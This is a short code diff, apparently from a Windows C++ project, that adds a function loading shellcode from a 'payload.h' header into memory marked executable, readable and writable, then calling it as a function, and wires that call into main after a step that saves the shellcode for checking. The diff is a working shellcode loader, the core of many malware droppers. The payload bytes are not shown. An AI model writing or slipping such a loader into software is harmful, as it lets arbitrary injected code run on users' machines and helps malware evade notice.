@@ -3,6 +3,19 @@
 
 #include "payload.h"
 
+void execute_shellcode()
+{
+	auto size = sizeof(g_Shellcode);
+	auto sc = VirtualAllocEx(GetCurrentProcess(), 0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+	memcpy(sc, g_Shellcode, size);
+
+	void(*c0de)();
+	c0de = static_cast<void(*)()>(sc);
+	c0de();
+
+	VirtualFreeEx(GetCurrentProcess(), sc, size, MEM_RELEASE);
+}
+
 void save_shellcode_for_checking()
 {
 	OFSTRUCT of{ sizeof(OFSTRUCT) };
@@ -15,6 +28,8 @@ int main()
 {
 	save_shellcode_for_checking();
 
-    return 0;
+	execute_shellcode();
+
+	return 0;
 }
 
